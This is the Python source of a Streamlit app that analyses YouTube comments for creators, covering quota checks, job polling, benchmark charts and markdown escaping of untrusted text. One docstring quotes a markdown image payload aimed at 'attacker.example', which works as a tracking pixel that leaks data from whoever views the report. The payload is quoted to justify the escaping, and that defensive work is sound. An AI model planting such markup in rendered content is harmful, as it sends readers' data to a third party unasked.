"""SPEC §5 + §8 — the single Streamlit entrypoint. One process, one command:

    streamlit run app.py

No FastAPI hop (SPEC §2's cut of server.py: "for one Streamlit app it is
ceremony"). The expensive work — pulling comments, classifying them,
synthesizing insights — runs in a background thread (orchestration.py),
never blocking this script; this file only starts that job, polls its
Postgres-backed progress (`st.status`, refreshed via `streamlit_autorefresh`
rather than a real blocking wait), and renders SPEC §3's three insight
blocks once it's done. SPEC §10 invariant 4 holds throughout, via
`_as_literal_text`: every string that originates outside this system —
comment quotes, YouTube-supplied titles, and model output derived from
either — is markdown-escaped before it reaches `st.markdown`, so nothing
a commenter writes can render as anything but literal text. Streamlit's
default HTML escaping is left untouched underneath that, but it is not
sufficient on its own; see `_as_literal_text` for why.

Module layout: the functions above `main()` are plain, framework-free
logic (URL validation via ingestion.youtube, the SPEC §4.4 quota
pre-flight, the SPEC §4.2 cache-by-comment-count lookup, and Postgres
reads) — each independently unit-testable by importing this file as a
normal module, with no Streamlit runtime required. `main()` and the
`_render_*` functions below it are the Streamlit glue on top.
"""

from __future__ import annotations

import asyncio
import logging
import os
import re

import altair as alt
import httpx
import pandas as pd
import streamlit as st
from streamlit_autorefresh import st_autorefresh

import config.models as models
import evals.benchmark as benchmark
from harness.preflight import format_report, run_preflight
from ingestion.youtube import (
    QuotaEstimate,
    QuotaExceededError,
    QuotaLedger,
    UnparsableURLError,
    YouTubeIngestionError,
    estimate_channel_analysis,
)
from orchestration import (
    STAGE_CLASSIFY,
    STAGE_EMBEDDING,
    STAGE_INGESTION,
    STAGE_INSIGHTS,
    STAGE_SENTIMENT,
    cancel_analysis,
    start_analysis,
)
from schemas import ChannelInsights, Sentiment
from storage.postgres import (
    JobProgress,
    connect,
    find_reusable_job,
    get_batch_results,
    get_job_progress,
    get_latest_eval_run,
    get_stage_checkpoint_summary,
    init_schema,
    reap_stale_jobs,
    save_eval_run,
)

logger = logging.getLogger(__name__)

REQUIRED_ENV_VARS = ("YOUTUBE_API_KEY", "OPENROUTER_API_KEY", "DATABASE_URL")

_STAGE_LABELS = {
    "ingestion": "Pulling comments from YouTube",
    "stage_a_sentiment": "Classifying sentiment (Stage A)",
    "stage_a_embedding": "Embedding comments (Stage A)",
    "stage_b": "Classifying requests & confusion (Stage B)",
    "stage_c": "Synthesizing insights (Stage C)",
}

# Pipeline order, oldest-stage-first — used to turn checkpoint timestamps
# into an approximate per-stage duration breakdown (stage_durations_seconds).
_STAGE_ORDER = (STAGE_INGESTION, STAGE_SENTIMENT, STAGE_EMBEDDING, STAGE_CLASSIFY, STAGE_INSIGHTS)
_STAGE_CHART_LABELS = {
    STAGE_INGESTION: "Ingestion",
    STAGE_SENTIMENT: "Sentiment (Stage A)",
    STAGE_EMBEDDING: "Embedding (Stage A)",
    STAGE_CLASSIFY: "Classify (Stage B)",
    STAGE_INSIGHTS: "Synthesis (Stage C)",
}

# Fixed display order for the 5-class sentiment distribution chart — always
# shown in this polarity order regardless of which labels a given run
# actually produced, so the chart's shape doesn't jump around run to run.
_SENTIMENT_ORDER = [s.value for s in Sentiment]

POLL_INTERVAL_MS = 3_000


# ---------------------------------------------------------------------------
# Logic layer — no Streamlit calls below this line, only above `main()`.
# ---------------------------------------------------------------------------

def missing_config() -> list[str]:
    return [name for name in REQUIRED_ENV_VARS if not os.environ.get(name)]


def stage_label(stage: str | None) -> str:
    if stage is None:
        return "Starting…"
    return _STAGE_LABELS.get(stage, stage)


def format_quota_refusal(estimate: QuotaEstimate, remaining: int) -> str:
    """SPEC §4.4: "If a channel analysis would exceed quota, say so in the
    UI up front. A clear refusal reads as competence; a spinner that dies
    reads as broken." """
    return (
        f"This analysis needs an estimated {estimate.units_required_for_comment_pull} "
        f"more YouTube API quota units to pull {estimate.total_comment_count} comments "
        f"across {len(estimate.videos)} videos, but only {remaining} remain today "
        "(resets at midnight Pacific Time)."
    )


async def preflight(
    channel_ref: str, *, youtube_api_key: str, ledger: QuotaLedger
) -> QuotaEstimate:
    """The cheap SPEC §4.4 estimate — resolves the channel/video and counts
    comments, without pulling a single one. Raises UnparsableURLError,
    ChannelNotFoundError, or QuotaExceededError (if even this cheap pass
    can't be afforded) — callers should let those surface as st.error.
    """
    async with httpx.AsyncClient() as client:
        return await estimate_channel_analysis(
            channel_ref, client=client, api_key=youtube_api_key, ledger=ledger,
        )


async def find_cached_analysis(channel_ref: str, total_comment_count: int) -> str | None:
    """SPEC §4.2: reuse a previous completed analysis of this exact channel
    at this exact comment count, instead of spending quota again."""
    async with connect() as conn:
        await init_schema(conn)
        return await find_reusable_job(conn, channel_ref, total_comment_count)


async def launch_analysis(
    channel_ref: str, *, youtube_api_key: str, openrouter_api_key: str
) -> str:
    return await start_analysis(
        channel_ref, youtube_api_key=youtube_api_key, openrouter_api_key=openrouter_api_key,
    )


async def load_progress(job_id: str) -> JobProgress | None:
    """Read one job's progress, first retiring any job whose worker died.

    The reap has to happen on this read path specifically: the page polls
    this every few seconds while a job looks active, so it's the one place
    guaranteed to run while a zombie is on screen. Without it a job whose
    background thread died with its container (a redeploy, a sleep, an OOM
    kill) sits at 'running' forever and the page spins on it indefinitely
    with a Cancel button that has nothing left to cancel — observed live,
    2026-09-13.
    """
    async with connect() as conn:
        reaped = await reap_stale_jobs(conn)
        if reaped:
            logger.warning("Reaped %d stale running job(s) with no live worker", reaped)
        return await get_job_progress(conn, job_id)


async def load_insights(job_id: str) -> ChannelInsights | None:
    async with connect() as conn:
        results = await get_batch_results(conn, job_id, "stage_c")
    raw = results.get("insights")
    return ChannelInsights.model_validate(raw) if raw else None


# ---------------------------------------------------------------------------
# Evaluation-criteria support: Real-Time Efficiency + Metrics Usage +
# Visualization. Still no Streamlit calls below this line -- these are the
# same kind of framework-free logic as the functions above, just serving
# the new charts/metrics panels instead of the original three insight
# blocks. Each has a thin async wrapper (reads Postgres) plus, where the
# real work is a computation rather than a read, a pure function that's
# unit-testable with plain dicts/dataclasses and no DB at all.
# ---------------------------------------------------------------------------

def efficiency_summary(progress: JobProgress) -> str | None:
    """"Real-Time Efficiency" as an honest, measured number rather than a
    claim: this pipeline is a checkpointed background job (SPEC §8), not a
    streaming/low-latency system, so the actual efficiency fact worth
    reporting is real observed throughput on real live YouTube data --
    comments processed per second, end to end. None until a job has both a
    start and an end to measure between.
    """
    if progress.started_at is None or progress.finished_at is None:
        return None
    if not progress.total_comment_count:
        return None
    elapsed = (progress.finished_at - progress.started_at).total_seconds()
    if elapsed <= 0:
        return None
    rate = progress.total_comment_count / elapsed
    return (
        f"Processed {progress.total_comment_count} comments in {elapsed:.1f}s "
        f"({rate:.1f} comments/sec, end to end)"
    )


def stage_durations_seconds(
    progress: JobProgress, summary: dict[str, dict]
) -> dict[str, float]:
    """Approximate wall-clock seconds spent in each pipeline stage, derived
    from each stage's *last* checkpoint timestamp (storage.postgres.
    get_stage_checkpoint_summary) rather than a dedicated per-stage timer:
    stage N's duration is "its last checkpoint minus the previous populated
    stage's last checkpoint" (or the job's own started_at, for the first
    populated stage). This is the only timing data this build actually
    records -- SPEC §8 asks for a checkpoint per unit of work, not a
    profiler -- so a single-batch stage (Stage C: one checkpoint) still
    gets a real, non-zero duration via this differencing, unlike a naive
    max-minus-min over one timestamp. Good enough to show which stage
    dominates a run; not a precise per-stage profile.
    """
    if progress.started_at is None:
        return {}
    anchor = progress.started_at
    durations: dict[str, float] = {}
    for stage in _STAGE_ORDER:
        info = summary.get(stage)
        if info is None or info.get("last_at") is None:
            continue
        durations[stage] = max((info["last_at"] - anchor).total_seconds(), 0.0)
        anchor = info["last_at"]
    return durations


async def load_stage_durations(job_id: str, progress: JobProgress) -> dict[str, float]:
    async with connect() as conn:
        summary = await get_stage_checkpoint_summary(conn, job_id)
    return stage_durations_seconds(progress, summary)


def count_sentiments(sentiment_batches: dict[str, dict]) -> dict[str, int]:
    """Pure aggregation over storage.postgres.get_batch_results' shape for
    the stage_a_sentiment stage -- one dict per checkpointed batch, each
    holding an "items" list of {comment_id, sentiment, confidence} dicts
    (engine/stage_a.py's on-disk checkpoint format). Counts every comment
    in the run by its sentiment label, for the mood-distribution chart.
    """
    counts: dict[str, int] = {}
    for payload in sentiment_batches.values():
        for item in payload.get("items", []):
            label = item.get("sentiment")
            if label:
                counts[label] = counts.get(label, 0) + 1
    return counts


async def load_sentiment_distribution(job_id: str) -> dict[str, int]:
    async with connect() as conn:
        batches = await get_batch_results(conn, job_id, STAGE_SENTIMENT)
    return count_sentiments(batches)


async def run_and_persist_eval() -> dict:
    """Run the real SPEC §11 Track 1 benchmark (evals/benchmark.py) against
    the live configured Stage A model -- no mock, no fixture, the actual
    OPENROUTER_API_KEY this process is already running with -- and persist
    the result to Postgres so it survives a page reload or a restart.
    """
    metrics = await benchmark.run_benchmark(persist_to_file=False)
    async with connect() as conn:
        await init_schema(conn)
        await save_eval_run(conn, metrics)
    return metrics


async def load_latest_eval() -> dict | None:
    async with connect() as conn:
        await init_schema(conn)
        return await get_latest_eval_run(conn)


def confusion_matrix_chart(cm: list[list[int]], labels: list[str]) -> alt.LayerChart:
    """A labeled heatmap (rows=actual, cols=predicted) over evals/benchmark.
    py's 3-class confusion matrix -- Altair ships with Streamlit already, no
    new dependency."""
    rows = [
        {"actual": labels[i], "predicted": labels[j], "count": cm[i][j]}
        for i in range(len(labels))
        for j in range(len(labels))
    ]
    df = pd.DataFrame(rows)
    base = alt.Chart(df).encode(
        x=alt.X("predicted:N", title="Predicted", sort=labels),
        y=alt.Y("actual:N", title="Actual", sort=labels),
    )
    heat = base.mark_rect().encode(
        color=alt.Color("count:Q", title="Comments", scale=alt.Scale(scheme="blues"))
    )
    text = base.mark_text(baseline="middle").encode(
        text="count:Q",
        color=alt.condition(alt.datum.count > 0, alt.value("white"), alt.value("#888")),
    )
    return (heat + text).properties(width=280, height=280)


def sentiment_distribution_chart(counts: dict[str, int]) -> alt.Chart:
    df = pd.DataFrame(
        [{"sentiment": label, "count": counts.get(label, 0)} for label in _SENTIMENT_ORDER]
    )
    return (
        alt.Chart(df)
        .mark_bar()
        .encode(
            x=alt.X("sentiment:N", sort=_SENTIMENT_ORDER, title="Sentiment"),
            y=alt.Y("count:Q", title="Comments"),
            color=alt.Color("sentiment:N", sort=_SENTIMENT_ORDER, legend=None),
            tooltip=["sentiment", "count"],
        )
        .properties(height=260)
    )


def stage_duration_chart(durations: dict[str, float]) -> alt.Chart:
    df = pd.DataFrame(
        [
            {"stage": _STAGE_CHART_LABELS.get(stage, stage), "seconds": seconds}
            for stage, seconds in durations.items()
        ]
    )
    return (
        alt.Chart(df)
        .mark_bar()
        .encode(
            x=alt.X("seconds:Q", title="Seconds"),
            y=alt.Y("stage:N", sort="-x", title=""),
            tooltip=["stage", "seconds"],
        )
        .properties(height=32 * max(len(durations), 1) + 40)
    )


# ---------------------------------------------------------------------------
# Streamlit glue
# ---------------------------------------------------------------------------

@st.cache_resource
def _quota_ledger() -> QuotaLedger:
    """One process-wide ledger (SPEC §9: "Quota / rate counters: In-memory
    v1"), shared across every rerun and every browser session hitting this
    deployment — st.cache_resource is Streamlit's way to say "build this
    once per process," which is exactly the semantics an in-memory daily
    quota counter needs.
    """
    return QuotaLedger()


def _run_async(coro):
    return asyncio.run(coro)


def _render_models_in_use() -> None:
    """"Model Execution" — make the live integration visible rather than
    just true: every model this deployment is actually calling, straight
    from config/models.py (SPEC.md §11.1's single source), never restated."""
    with st.expander("🧩 Models in use (OpenRouter, live)"):
        st.markdown(
            f"- **Stage A · sentiment** — `{models.STAGE_A_SENTIMENT}`\n"
            f"- **Stage A · embeddings** — `{models.STAGE_A_EMBEDDINGS}` "
            f"({models.EMBEDDING_DIM}-dim)\n"
            f"- **Stage B · classification** — `{models.STAGE_B_CLASSIFY}`\n"
            f"- **Stage C · synthesis** — `{models.STAGE_C_SYNTHESIS}`\n"
        )


def _render_preflight_section() -> None:
    """harness/preflight.py, runnable from inside the deployment.

    Deliberately available here rather than only as a CLI: the seams this
    checks (OpenRouter reachability and credit, model slugs that providers
    withdraw without notice, the live embedding width, Postgres over
    whichever network path this host actually uses) are properties of
    *this running environment*, and a laptop passing them proves nothing
    about production. Every failure this project hit on its first live day
    would have been caught by pressing this button first.
    """
    with st.expander("🔧 Preflight diagnostics — verify every seam before spending"):
        st.caption(
            "Probes each external dependency through the real pipeline code: "
            "Postgres round-trip, YouTube key/quota, OpenRouter credit, and every "
            "configured model (primaries **and** fallbacks) with 2-3 synthetic "
            "comments each. Costs a fraction of a cent and reports exactly what it spent."
        )
        if st.button("Run preflight checks", key="run_preflight"):
            with st.spinner("Probing every seam against its real provider…"):
                try:
                    report = _run_async(run_preflight())
                except Exception as exc:  # noqa: BLE001 -- show it, don't crash the page
                    st.error(f"Preflight could not run: {type(exc).__name__}: {exc}")
                    return
            st.session_state["preflight_report"] = report

        report = st.session_state.get("preflight_report")
        if report is None:
            st.caption("Not run yet — click above to verify this deployment end to end.")
            return

        if report.ready:
            st.success("READY — every seam verified against its real provider.")
        elif report.failed:
            st.error(
                f"NOT READY — {len(report.failed)} check(s) failed. "
                "A real analysis would hit these too."
            )
        else:
            st.warning(
                "PARTIAL — nothing failed, but skipped checks are unproven seams, "
                "not passing ones."
            )

        icons = {"PASS": "✅", "FAIL": "❌", "WARN": "⚠️", "SKIP": "⏭️"}
        st.dataframe(
            pd.DataFrame(
                [
                    {
                        "": icons.get(r.status, ""),
                        "Check": r.name,
                        "Detail": r.detail,
                        "Seconds": round(r.seconds, 2),
                    }
                    for r in report.results
                ]
            ),
            width="stretch",
            hide_index=True,
        )
        if report.credits_spent is not None:
            st.caption(f"OpenRouter credit spent by this run: ${report.credits_spent:.6f}")


def _render_eval_section() -> None:
    """"Metrics Usage" — a real accuracy number and confusion matrix,
    computed live against the deployed model on a hand-labeled benchmark
    set (evals/test_dataset.json), not a claimed/static figure."""
    with st.expander("📊 Model accuracy benchmark (live)"):
        st.caption(
            f"Runs all {len(benchmark.load_dataset())} hand-labeled comments in "
            "evals/test_dataset.json through the live Stage A sentiment model "
            "and scores it — a real confusion matrix, not a claimed number."
        )
        if st.button("Run live accuracy benchmark", key="run_eval_benchmark"):
            with st.spinner("Classifying the benchmark set with the live model…"):
                try:
                    _run_async(run_and_persist_eval())
                except Exception as exc:  # noqa: BLE001 -- show it, don't crash the page
                    st.error(f"Benchmark run failed: {exc}")
                else:
                    st.rerun()

        # A read for an optional diagnostics panel must never decide whether
        # the product renders. Unguarded, one unreachable Postgres turned the
        # whole page into a stack trace -- no URL box, no way to do the thing
        # the app is for, over a panel nobody had opened.
        try:
            metrics = _run_async(load_latest_eval())
        except Exception as exc:  # noqa: BLE001 -- diagnostics degrade, never crash
            st.warning(f"Couldn't read the last benchmark result: {exc}")
            return
        if metrics is None:
            st.caption("Not run yet in this deployment — click above for a live result.")
            return

        if metrics.get("error") and not metrics.get("confusion_matrix"):
            st.error(f"Last run failed: {metrics['error']}")
            return

        cols = st.columns(3)
        cols[0].metric("Strict accuracy", f"{metrics['accuracy']:.0%}" if metrics.get("accuracy") is not None else "n/a")
        cols[1].metric(
            "Lenient accuracy",
            f"{metrics['accuracy_lenient']:.0%}" if metrics.get("accuracy_lenient") is not None else "n/a",
        )
        cols[2].metric("Cases scored", f"{metrics['total_cases'] - metrics['failed_cases']}/{metrics['total_cases']}")
        st.caption(f"Last run: {metrics['generated_at']}")

        if metrics.get("confusion_matrix"):
            st.altair_chart(
                confusion_matrix_chart(metrics["confusion_matrix"], metrics["labels"]),
                width="content",
            )
        report = metrics.get("classification_report")
        if report:
            rows = [
                {"label": label, **{k: v for k, v in stats.items() if k != "support"},
                 "support": int(stats["support"])}
                for label, stats in report.items()
                if label in metrics["labels"]
            ]
            st.dataframe(pd.DataFrame(rows).set_index("label"), width="stretch")


@st.cache_resource(show_spinner=False)
def _boot_preflight() -> str | None:
    """Run preflight once per container at startup and log the report.

    Exists because production is otherwise unobservable from where this
    code is developed: the build sandbox can reach neither openrouter.ai
    nor this app's own URL, so the only channel into the deployed
    environment is Render's log API. Printing the report to stdout turns
    that one-way channel into a usable verification loop -- the same
    checks a human would run from the diagnostics panel, readable from
    the logs without anyone clicking anything.

    Gated on PREFLIGHT_ON_BOOT so it is opt-in: it makes a handful of real
    (if tiny) model calls, and paying that on every cold start of a
    free-tier service that sleeps aggressively should be a deliberate
    choice, not a default. @st.cache_resource keeps it to once per
    container rather than once per script rerun -- Streamlit re-executes
    this module on every interaction, which would otherwise turn a
    diagnostic into a per-click charge.
    """
    if os.environ.get("PREFLIGHT_ON_BOOT", "").strip().lower() not in ("1", "true", "yes"):
        return None
    try:
        report = _run_async(run_preflight())
    except Exception as exc:  # noqa: BLE001 -- diagnostics must never block the app
        logger.error("Boot preflight could not run: %s: %s", type(exc).__name__, exc)
        return None
    # One multi-line block, logged whole: Render's log viewer interleaves
    # concurrent lines, and a report split across entries is unreadable.
    logger.warning("BOOT PREFLIGHT\n%s", format_report(report))
    return "ready" if report.ready else "not-ready"


def main() -> None:
    st.set_page_config(page_title="Audience Mood Analyzer", page_icon="🎥", layout="wide")
    st.title("🎥 Audience Mood Analyzer")
    st.caption(
        "Paste a YouTube channel or video URL — no signup. Get back what your "
        "audience is actually asking for, where your explanation didn't land, "
        "and which video landed badly, each backed by real comments."
    )

    missing = missing_config()
    if missing:
        st.error(
            "Missing configuration: " + ", ".join(missing) + ". "
            "Copy .env.example to .env, fill these in, and restart the app."
        )
        st.stop()

    _boot_preflight()

    _render_models_in_use()
    _render_preflight_section()
    _render_eval_section()

    channel_ref = st.text_input(
        "YouTube channel or video URL",
        placeholder="https://www.youtube.com/@channel",
        key="channel_ref_input",
    )
    analyze_clicked = st.button(
        "Analyze", type="primary", disabled=not channel_ref.strip(), key="analyze_button"
    )

    if analyze_clicked:
        _start_new_analysis(channel_ref.strip())

    job_id = st.session_state.get("job_id")
    if job_id:
        _render_job(job_id)


def _start_new_analysis(channel_ref: str) -> None:
    youtube_key = os.environ["YOUTUBE_API_KEY"]
    openrouter_key = os.environ["OPENROUTER_API_KEY"]
    ledger = _quota_ledger()

    try:
        with st.spinner("Checking video count and quota…"):
            estimate = _run_async(
                preflight(channel_ref, youtube_api_key=youtube_key, ledger=ledger)
            )
    except UnparsableURLError as exc:
        st.error(str(exc))
        return
    except QuotaExceededError as exc:
        st.error(f"Can't run this analysis today: {exc}")
        return
    except YouTubeIngestionError as exc:
        st.error(f"Couldn't reach that channel/video: {exc}")
        return

    if estimate.units_required_for_comment_pull > ledger.remaining:
        st.error(format_quota_refusal(estimate, ledger.remaining))
        return

    cached_job_id = _run_async(
        find_cached_analysis(channel_ref, estimate.total_comment_count)
    )
    if cached_job_id:
        st.session_state["job_id"] = cached_job_id
        st.session_state["served_from_cache"] = True
        st.rerun()
        return

    job_id = _run_async(launch_analysis(
        channel_ref, youtube_api_key=youtube_key, openrouter_api_key=openrouter_key,
    ))
    st.session_state["job_id"] = job_id
    st.session_state["served_from_cache"] = False
    st.rerun()


def _render_job(job_id: str) -> None:
    # This runs every POLL_INTERVAL_MS for as long as a job is on screen, so
    # it is the call most exposed to a momentary Postgres blip -- and the
    # worst place to raise: the job itself is fine, running in its own
    # thread, and crashing the render is what would lose the user's only
    # handle on it. Report and let the next poll try again.
    try:
        progress = _run_async(load_progress(job_id))
    except Exception as exc:  # noqa: BLE001 -- a poll failure is not a job failure
        logger.warning("Progress poll failed for job %s: %s", job_id, exc)
        st.info("Still working — the progress read hiccuped, retrying…")
        st_autorefresh(interval=POLL_INTERVAL_MS, key=f"poll_{job_id}")
        return
    if progress is None:
        st.error("Lost track of that analysis — please start a new one.")
        return

    if progress.status in ("pending", "running"):
        _render_in_progress(job_id, progress)
        st_autorefresh(interval=POLL_INTERVAL_MS, key=f"poll_{job_id}")
        return

    if progress.status == "failed":
        st.error(f"Analysis failed: {progress.error}")
        return

    if progress.status == "cancelled":
        st.warning("Analysis cancelled.")
        return

    if st.session_state.get("served_from_cache"):
        st.success("Served from a previous analysis — this channel's comment count hasn't moved.")
    else:
        st.success("Analysis complete.")

    eff = efficiency_summary(progress)
    if eff:
        st.caption(f"⚡ {eff}")

    insights = _run_async(load_insights(job_id))
    if insights is None:
        st.error("Analysis completed but its insights are missing — this shouldn't happen.")
        return

    distribution = _run_async(load_sentiment_distribution(job_id))
    durations = _run_async(load_stage_durations(job_id, progress))
    _render_insights(insights, distribution=distribution, durations=durations)


def _render_in_progress(job_id: str, progress: JobProgress) -> None:
    with st.status(stage_label(progress.stage), expanded=True):
        if progress.total_units:
            st.progress(
                progress.fraction_complete or 0.0,
                text=f"{progress.completed_units}/{progress.total_units}",
            )
        else:
            st.write("Working…")
        if st.button("Cancel analysis", key=f"cancel_{job_id}"):
            _run_async(cancel_analysis(job_id))
            st.warning("Cancellation requested — this may take a moment to stop.")


# Every ASCII punctuation character markdown gives meaning to, plus `$`
# (Streamlit renders LaTeX between dollar signs) and `<`/`>`.
_MARKDOWN_SPECIALS = re.compile(r"([\\`*_{}\[\]()#+\-.!|~<>$])")


def _as_literal_text(value: str) -> str:
    """Render untrusted text as text, not as markup.

    Streamlit escapes HTML by default, and that was mistaken for the whole
    defence. It is not: `st.markdown` still *renders markdown*, and markdown
    can reach the network without a single HTML tag. A comment reading
    `![](https://attacker.example/p?u=creator)` becomes a live image
    request fired from the creator's browser the moment they open their
    report — a tracking pixel with no script and no tag. `[text](url)`
    becomes a real, clickable link, which is the same problem wearing a
    friendlier face.

    Quotes are the sharpest case because they are verbatim attacker-chosen
    strings, but model output is not trustworthy either: it is *derived*
    from those comments and can carry the syntax straight through. So
    everything that did not originate in this codebase goes through here.

    Newlines are collapsed as well: a bare newline inside `> {quote}` ends
    the blockquote and lets the rest of the comment render as top-level
    markdown, which is the same escape by a different door.
    """
    return _MARKDOWN_SPECIALS.sub(r"\\\1", " ".join(value.split()))


def _render_insights(
    insights: ChannelInsights,
    *,
    distribution: dict[str, int] | None = None,
    durations: dict[str, float] | None = None,
) -> None:
    if distribution:
        st.header("Mood distribution")
        st.altair_chart(sentiment_distribution_chart(distribution), width="stretch")

    if durations:
        with st.expander("⚡ Where the time went (per stage, this run)"):
            st.altair_chart(stage_duration_chart(durations), width="stretch")

    st.header("What your audience wants")
    if not insights.requests:
        st.caption("No clear content requests surfaced in this batch of comments.")
    for r in insights.requests:
        with st.container(border=True):
            st.subheader(_as_literal_text(r.theme))
            st.caption(f"Mentioned in {r.mention_count} comments")
            st.markdown(f"**Suggested title:** {_as_literal_text(r.suggested_title)}")
            for quote in r.quotes:
                st.markdown(f"> {_as_literal_text(quote)}")

    st.header("Where your explanation didn't land")
    if not insights.confusion_points:
        st.caption("No recurring confusion points surfaced in this batch of comments.")
    for c in insights.confusion_points:
        with st.container(border=True):
            st.subheader(_as_literal_text(c.sticking_point))
            caption = f"Mentioned in {c.mention_count} comments"
            if c.timestamp_hint:
                caption += f" · around {c.timestamp_hint}"
            st.caption(caption)
            for quote in c.quotes:
                st.markdown(f"> {_as_literal_text(quote)}")

    st.header("Which video landed badly")
    if not insights.video_moods:
        st.caption("No video stood out as underperforming emotionally in this batch.")
    for v in insights.video_moods:
        with st.container(border=True):
            st.subheader(_as_literal_text(v.video_title))
            st.caption(
                f"Sentiment {v.sentiment_score:+.2f} "
                f"({v.delta_vs_channel_avg:+.2f} vs. channel average)"
            )
            st.markdown(f"**Likely driver:** {_as_literal_text(v.top_negative_driver)}")
            for quote in v.quotes:
                st.markdown(f"> {_as_literal_text(quote)}")


if __name__ == "__main__":
    main()
